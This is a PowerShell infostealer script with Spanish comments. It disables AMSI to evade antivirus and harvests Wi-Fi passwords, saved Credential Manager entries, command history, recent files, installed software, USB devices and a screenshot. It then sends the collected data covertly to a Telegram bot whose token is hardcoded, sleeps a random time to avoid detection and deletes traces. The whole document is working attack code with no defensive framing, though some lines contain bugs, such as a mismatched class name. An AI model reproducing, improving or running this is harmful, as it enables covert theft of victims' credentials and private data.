# Bypass AMSI y ejecución en memoria para evitar AVs
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
    .GetField('amsiInitFailed','NonPublic,Static')
    .SetValue($null,$true)

# Evadir registro de eventos
$ErrorActionPreference = "SilentlyContinue"
[System.Net.ServicePointManager]::Expect100Continue = $false

# Crear un directorio temporal en memoria (evita escribir en disco)
$TempDir = [System.IO.Path]::Combine($env:TEMP, "p")
if (!(Test-Path $TempDir)) { New-Item -Path $TempDir -ItemType Directory | Out-Null }

# Recopilación de información del sistema sin archivos temporales
$Data = @()
$Data += "🖥️ *Equipo:* $env:COMPUTERNAME"
$Data += "👤 *Usuario:* $env:USERNAME"
$Data += "🌐 *IP Local:* " + (Get-NetIPAddress -AddressFamily IPv4 | Where-Object { $_.IPAddress -notmatch '(127.0.0.1|169.254.\\d+.\\d+)' } | Select-Object -ExpandProperty IPAddress)
$Data += "🛜 *Servidores DNS:* " + ((Get-DnsClientServerAddress).ServerAddresses -join ', ')

# Obtener claves Wi-Fi en memoria (sin archivos XML)
$WifiData = netsh wlan show profiles | Select-String "Perfil de todos los usuarios" | ForEach-Object {
    $Profile = $_ -replace ".* : ", ""
    $Key = (netsh wlan show profile name="$Profile" key=clear | Select-String "Contenido de la clave" -Quiet) -replace ".* : ", ""
    if ($Key) { "📶 *Wi-Fi:* $Profile 🔑 *Clave:* $Key" }
}
$Data += $WifiData

# Listar cuentas de usuario
$Data += "👥 *Usuarios:* " + (Get-WmiObject -Class Win32_UserAccount | Select-Object -ExpandProperty Name -join ', ')

# Obtener IP pública sin Invoke-WebRequest (evita detección)
$PublicIP = (New-Object System.Net.WebClient).DownloadString("http://ifconfig.me/ip").Trim()
$Data += "🌍 *IP Pública:* $PublicIP"

# Extraer credenciales guardadas en Windows Credential Manager
$Data += "🔑 *Credenciales Guardadas:*"
$Creds = cmdkey /list | Select-String "Target:" | ForEach-Object { $_ -replace "Target: ", "" }
$Data += $Creds

# Historial de comandos
$Data += "📜 *Historial de PowerShell:* " + (Get-Content (Get-PSReadlineOption).HistorySavePath -ErrorAction Ignore -Tail 10 -join ', ')
$Data += "📜 *Historial de CMD:* " + (Get-Content "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt" -ErrorAction Ignore -Tail 10 -join ', ')

# Archivos recientes abiertos
$RecentFiles = Get-ChildItem "$env:APPDATA\Microsoft\Windows\Recent" -ErrorAction Ignore | Select-Object -ExpandProperty Name
$Data += "📂 *Archivos recientes:* " + ($RecentFiles -join ', ')

# Procesos activos y programas instalados
$Data += "⚙️ *Procesos Activos:* " + (Get-Process | Select-Object -ExpandProperty ProcessName -join ', ')
$Data += "📦 *Programas Instalados:* " + (Get-WmiObject -Class Win32_Product | Select-Object -ExpandProperty Name -join ', ')

# Dispositivos USB conectados
$USBDevices = Get-PnpDevice | Where-Object { $_.InstanceId -match "USB" } | Select-Object -ExpandProperty FriendlyName
$Data += "🔌 *Dispositivos USB:* " + ($USBDevices -join ', ')

# Captura de pantalla en segundo plano
$ScreenshotPath = "$TempDir\screen.png"
Add-Type -TypeDefinition @"
using System;
using System.Drawing;
using System.Drawing.Imaging;
using System.Windows.Forms;
public class Screenshot {
    public static void Capture(string path) {
        Bitmap bmp = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height);
        Graphics gfx = Graphics.FromImage(bmp);
        gfx.CopyFromScreen(0, 0, 0, 0, bmp.Size);
        bmp.Save(path, ImageFormat.Png);
    }
}
"@ -Language CSharp
[ScreenCapture]::Capture($ScreenshotPath)

# Cifrar datos antes de enviarlos
$EncryptedData = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($Data -join "`n"))

# Enviar datos a Telegram de forma oculta
$BotToken = "7241408968:AAHl791hjv8m09mfxUJsYNArHTGfX5BwChM"
$ChatID = " 7242230391"
$Params = @{ chat_id = $ChatID; text = $EncryptedData; parse_mode = "Markdown" }
Start-Job -ScriptBlock {
    param($Params, $BotToken)
    Invoke-RestMethod -Uri "https://api.telegram.org/bot$BotToken/sendMessage" -Method Post -Body $Params | Out-Null
} -ArgumentList $Params, $BotToken | Out-Null

# Enviar captura de pantalla
Start-Job -ScriptBlock {
    param($BotToken, $ChatID, $ScreenshotPath)
    Invoke-RestMethod -Uri "https://api.telegram.org/bot$BotToken/sendPhoto" -Method Post -Form @{ chat_id = $ChatID; photo = Get-Item $ScreenshotPath }
} -ArgumentList $BotToken, $ChatID, $ScreenshotPath | Out-Null

# Esperar un tiempo aleatorio antes de salir para evitar detección
Start-Sleep -Seconds (Get-Random -Minimum 5 -Maximum 15)

# Eliminar rastro
Remove-Item $ScreenshotPath -ErrorAction Ignore
